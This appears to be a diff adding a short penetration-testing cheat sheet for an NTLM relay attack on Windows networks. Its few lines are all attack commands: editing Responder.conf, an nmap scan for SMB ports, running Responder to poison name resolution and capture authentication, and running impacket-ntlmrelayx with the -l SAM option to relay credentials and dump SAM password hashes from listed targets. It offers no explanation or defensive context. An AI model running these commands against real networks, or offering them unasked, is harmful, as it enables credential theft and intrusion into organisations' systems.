@@ -1,0 +1,15 @@
+NTLMRELAY
+ 
+First we have to set "off" SMB and HTTP protocols on "responder.conf" file.
+
+   $ nano /etc/responder/Responder.conf
+
+   $ nmap -p445,139 --open -n -sS -iL scope.txt -oA 445-139ip.txt
+
+Listener
+
+   $ responder -I eth0 -wrfFb -vvv
+
+Hunt
+
+  $ impacket-ntlmrelayx -tf NTLMRELAYTARGETS.txt -l SAM -smb2support
